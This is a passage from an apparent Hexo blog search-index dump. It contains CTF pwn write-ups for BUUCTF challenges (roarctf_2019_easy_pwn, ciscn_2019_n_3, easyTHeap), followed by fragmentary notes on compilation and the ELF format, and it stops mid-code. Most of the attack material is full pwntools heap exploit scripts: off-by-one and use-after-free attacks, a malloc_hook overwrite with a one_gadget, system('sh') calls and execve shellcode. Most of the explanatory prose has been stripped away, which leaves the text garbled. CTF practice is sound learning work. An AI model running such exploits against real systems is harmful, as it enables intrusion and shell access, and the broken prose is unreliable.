class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29579</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.15\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size,content)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">1</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">\tsl(str(size))</span><br><span class=\"line\">\tru(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">\tsl(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">2</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tsl(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">prt</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tru(<span class=\"string\">\"Your choice :\"</span>)</span><br><span class=\"line\">\tsl(str(<span class=\"number\">3</span>))</span><br><span class=\"line\">\tru(<span class=\"string\">\"Index :\"</span>)</span><br><span class=\"line\">\tsl(str(index))</span><br><span class=\"line\">magic = elf.sym[<span class=\"string\">\"magic\"</span>]</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.15\")</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b'A'</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b'B'</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">add(<span class=\"number\">0x8</span>,p32(magic))</span><br><span class=\"line\">prt(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"roarctf-2019-easy-pwn\"><a href=\"#roarctf-2019-easy-pwn\" class=\"headerlink\" title=\"roarctf_2019_easy_pwn\"></a>roarctf_2019_easy_pwn</h2><p></p>\n<ol>\n<li>add<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221232736.png\" alt=\"image-20210307221232736\"></li>\n<li>edit<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221248396.png\" alt=\"image-20210307221248396\"></li>\n<li>del<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221303827.png\" alt=\"image-20210307221303827\"></li>\n<li>print<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221324705.png\" alt=\"image-20210307221324705\"></li>\n</ol>\n<h3 id=\"-3\"><a href=\"#-3\" class=\"headerlink\" title=\"\"></a></h3><p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221400661.png\" alt=\"image-20210307221400661\"></p>\n<p>off by one</p>\n<h3 id=\"-4\"><a href=\"#-4\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li>vnunsorted bin</li>\n<li>chunkmallocrealloc_hookmalloc_hookgetshell</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"</span></span><br><span class=\"line\"><span class=\"comment\">#p = remote(\"node3.buuoj.cn\",29310)</span></span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn3.23\"</span>,env =&#123;<span class=\"string\">\"LD_PRELOAD\"</span>:<span class=\"string\">\"./libc-2.232.so\"</span>&#125;)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc-2.232.so\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'choice: '</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'1'</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">'size:'</span>)</span><br><span class=\"line\">    sl(str(size))</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index,size,data)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'choice: '</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'2'</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">'index:'</span>)</span><br><span class=\"line\">    sl(str(index))</span><br><span class=\"line\">    ru(<span class=\"string\">'size:'</span>)</span><br><span class=\"line\">    sl(str(size))</span><br><span class=\"line\">    ru(<span class=\"string\">'content:'</span>)</span><br><span class=\"line\">    s(data)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'choice: '</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'3'</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">'index:'</span>)</span><br><span class=\"line\">    sl(str(index))</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'choice: '</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'4'</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">'index:'</span>)</span><br><span class=\"line\">    sl(str(index))</span><br><span class=\"line\">add(<span class=\"number\">0x28</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#4</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">payload = <span class=\"string\">'\\x00'</span>*<span class=\"number\">0x28</span> + <span class=\"string\">'\\xE1'</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,(<span class=\"number\">0x28</span>+<span class=\"number\">10</span>),payload)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">show(<span class=\"number\">2</span>)</span><br><span class=\"line\">ru(<span class=\"string\">'content: '</span>)</span><br><span class=\"line\">libc_base=uu64(r(<span class=\"number\">6</span>))<span class=\"number\">-0x3c4b78</span></span><br><span class=\"line\">leak(<span class=\"string\">\"libc_base\"</span>,libc_base)</span><br><span class=\"line\">malloc_hook = libc_base + libc.symbols[<span class=\"string\">'__malloc_hook'</span>]</span><br><span class=\"line\">leak(<span class=\"string\">\"malloc_hook\"</span>,malloc_hook)</span><br><span class=\"line\">realloc = libc_base + <span class=\"number\">0x846C0</span>    <span class=\"comment\">#</span></span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4526A</span></span><br><span class=\"line\">leak(<span class=\"string\">\"realloc\"</span>,realloc)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>) <span class=\"comment\">#5 -&gt;2</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>) </span><br><span class=\"line\">payload = p64(malloc_hook<span class=\"number\">-0x23</span>)</span><br><span class=\"line\">edit(<span class=\"number\">5</span>,len(payload),payload)</span><br><span class=\"line\">add(<span class=\"number\">0x60</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>)<span class=\"comment\">#6</span></span><br><span class=\"line\">pld = <span class=\"string\">'\\x00'</span>*(<span class=\"number\">0x13</span><span class=\"number\">-0x8</span>) + p64(one_gadget)+p64(realloc)</span><br><span class=\"line\">edit(<span class=\"number\">6</span>,len(pld),pld)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-n-3\"><a href=\"#ciscn-2019-n-3\" class=\"headerlink\" title=\"ciscn_2019_n_3\"></a>ciscn_2019_n_3</h2><p></p>\n<ol>\n<li>add<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163719199.png\" alt=\"image-20210308163719199\"></li>\n<li>del<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163737207.png\" alt=\"image-20210308163737207\"></li>\n<li>print<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163753460.png\" alt=\"image-20210308163753460\"></li>\n</ol>\n<p></p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163854025.png\" alt=\"image-20210308163854025\"></p>\n<h3 id=\"-4\"><a href=\"#-4\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li>UAF</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\">shellcode = <span class=\"string\">\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27020</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.25\")</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.23\",env =&#123;\"LD_PRELOAD\":\"./libc-2.232.so\"&#125;)</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.25\"</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">newnote</span><span class=\"params\">(idx,type,value,length=<span class=\"number\">0</span>)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'CNote &gt; '</span>)</span><br><span class=\"line\">    sl(str(<span class=\"number\">1</span>))</span><br><span class=\"line\">    ru(<span class=\"string\">'Index &gt; '</span>)</span><br><span class=\"line\">    sl(str(idx))</span><br><span class=\"line\">    ru(<span class=\"string\">'Type &gt; '</span>)</span><br><span class=\"line\">    sl(str(type))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> type == <span class=\"number\">1</span>:</span><br><span class=\"line\">        ru(<span class=\"string\">'Value &gt; '</span>)</span><br><span class=\"line\">        sl(str(value))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        ru(<span class=\"string\">'Length &gt; '</span>)</span><br><span class=\"line\">        sl(str(length))</span><br><span class=\"line\">        ru(<span class=\"string\">'Value &gt; '</span>)</span><br><span class=\"line\">        sl(value)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delnote</span><span class=\"params\">(idx)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">'CNote &gt; '</span>)</span><br><span class=\"line\">    sl(str(<span class=\"number\">2</span>))</span><br><span class=\"line\">    ru(<span class=\"string\">'Index &gt; '</span>)</span><br><span class=\"line\">    sl(str(idx))</span><br><span class=\"line\">newnote(<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"number\">0x61</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">newnote(<span class=\"number\">2</span>,<span class=\"number\">1</span>,<span class=\"number\">0x41</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">delnote(<span class=\"number\">1</span>) <span class=\"comment\"># fastbin attack</span></span><br><span class=\"line\">delnote(<span class=\"number\">2</span>)</span><br><span class=\"line\">newnote(<span class=\"number\">3</span>,<span class=\"number\">2</span>,<span class=\"string\">'sh\\x00\\x00'</span>+p32(elf.plt[<span class=\"string\">'system'</span>]),<span class=\"number\">0xc</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">delnote(<span class=\"number\">1</span>)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"V-amp-N2020--easyTHeap\"><a href=\"#V-amp-N2020--easyTHeap\" class=\"headerlink\" title=\"[V&amp;N2020 ]easyTHeap\"></a>[V&amp;N2020 ]easyTHeap</h2><p></p>\n<ol>\n<li>add<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180234965.png\" alt=\"image-20210308180234965\"></li>\n<li>edit<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180253041.png\" alt=\"image-20210308180253041\"></li>\n<li>show<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/../../../Desktop/image-20210308180305916.png\" alt=\"image-20210308180305916\"></li>\n<li>del<img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180318580.png\" alt=\"image-20210308180318580\"></li>\n</ol>\n<p></p>\n<p><img src=\"/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308180214617.png\" alt=\"image-20210308180214617\"></p>\n","categories":[],"tags":["BUU"]},{"title":"","url":"https://pz1o.top/2021/02/14//","content":"<h1 id=\"0x01-\"><a href=\"#0x01-\" class=\"headerlink\" title=\"0x01 \"></a>0x01 </h1><h2 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc a.c</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<p>&gt;&gt;&gt;</p>\n</blockquote>\n<h3 id=\"1-1-\"><a href=\"#1-1-\" class=\"headerlink\" title=\"1.1 \"></a>1.1 </h3><p>#</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -E a.c -o a.i</span><br><span class=\"line\">cpp a.c &gt; a.i</span><br></pre></td></tr></table></figure>\n<h3 id=\"1-2-\"><a href=\"#1-2-\" class=\"headerlink\" title=\"1.2 \"></a>1.2 </h3><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -S a.i -o a.s</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>ccc1</p>\n<p>c++cc1plus</p>\n</blockquote>\n<h3 id=\"1-3-\"><a href=\"#1-3-\" class=\"headerlink\" title=\"1.3 \"></a>1.3 </h3><p></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">as a.s -o a.o</span><br><span class=\"line\">gcc -c a.s -o a.o</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>as</p>\n</blockquote>\n<p></p>\n<h3 id=\"1-4-\"><a href=\"#1-4-\" class=\"headerlink\" title=\"1.4 \"></a>1.4 </h3><p></p>\n<p></p>\n<h2 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h2><p></p>\n<p>6</p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<h3 id=\"2-1-\"><a href=\"#2-1-\" class=\"headerlink\" title=\"2.1 \"></a>2.1 </h3><p><strong></strong></p>\n<p></p>\n<h3 id=\"2-2-\"><a href=\"#2-2-\" class=\"headerlink\" title=\"2.2 \"></a>2.2 </h3><p><strong></strong><strong></strong></p>\n<p><strong></strong></p>\n<p></p>\n<h3 id=\"2-3-\"><a href=\"#2-3-\" class=\"headerlink\" title=\"2.3 \"></a>2.3 </h3><p><strong></strong></p>\n<p><strong></strong><strong></strong></p>\n<p></p>\n<p></p>\n<p></p>\n<h3 id=\"2-4-\"><a href=\"#2-4-\" class=\"headerlink\" title=\"2.4 \"></a>2.4 </h3><p><strong></strong></p>\n<p></p>\n<p></p>\n<h3 id=\"2-5-\"><a href=\"#2-5-\" class=\"headerlink\" title=\"2.5 \"></a>2.5 </h3><p><strong></strong><strong></strong></p>\n<p></p>\n<p><strong></strong></p>\n<h2 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h2><p><strong></strong></p>\n<p><strong></strong></p>\n<h2 id=\"4-\"><a href=\"#4-\" class=\"headerlink\" title=\"4.\"></a>4.</h2><p><strong></strong></p>\n<p><strong>Address and Storage AllocationSymbol ResolutionRelocation</strong></p>\n<blockquote>\n<p></p>\n</blockquote>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210207155541582.png\" alt=\"image-20210207155541582\"></p>\n<p><strong></strong></p>\n<blockquote>\n<p></p>\n<p>main.cfun.cfoo()</p>\n<p>main.cfoofoo</p>\n<p></p>\n<p>foofoofoomainfoo</p>\n</blockquote>\n<h1 id=\"0x02-\"><a href=\"#0x02-\" class=\"headerlink\" title=\"0x02 \"></a>0x02 </h1><p><strong></strong></p>\n<p></p>\n<p></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210207161220722.png\" alt=\"image-20210207161220722\"></p>\n<p></p>\n<h2 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h2><p>windowsPEPortable ExecutableLinuxELFExecutable Linkable Format</p>\n<p></p>\n<p>OMFObject Module FormatUnix a.outMS-DOS.COM</p>\n<p><strong></strong>Dynamic Linking Librarywindowsdlllinuxso<strong></strong>Static Linking LibarywindowslibLinuxa</p>\n<p></p>\n<p></p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">ELF</th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">(Relocatable File)</td>\n<td></td>\n<td>Linux.o Winobj</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">(Executable File)</td>\n<td>,</td>\n<td>Linux.out Win.exe</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">(Shared Object File)</td>\n<td><strong></strong></td>\n<td>Linux.soWinDLL</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">(Core Dump File)</td>\n<td></td>\n<td>LinuxCore Dump</td>\n</tr>\n</tbody>\n</table>\n</div>\n<blockquote>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210208204903438.png\" alt=\"image-20210208204903438\"></p>\n</blockquote>\n<h2 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h2><p></p>\n<p><strong></strong>Section<strong></strong>Segment</p>\n<p></p>\n<p><strong></strong><code>.code</code><code>.text</code></p>\n<p><strong></strong><code>.data</code></p>\n<p><img src=\"/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210208205643721.png\" alt=\"image-20210208205643721\"></p>\n<blockquote>\n<p>ELF<strong></strong></p>\n<p><strong></strong></p>\n<p><strong></strong></p>\n<p></p>\n</blockquote>\n<p><code>.text</code>c</p>\n<p><code>.data</code></p>\n<p><code>.bss</code></p>\n<blockquote>\n<p>bss</p>\n<p>0data0</p>\n<p>bss</p>\n<p><strong>bss</strong></p>\n</blockquote>\n<p><strong>bss</strong></p>\n<h2 id=\"3-SimpleSection-o\"><a href=\"#3-SimpleSection-o\" class=\"headerlink\" title=\"3.SimpleSection.o\"></a>3.SimpleSection.o</h2><p>a.o</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> global_init_var = <span class=\"number\">84</span>;</span><br><span class=\"line\"><span 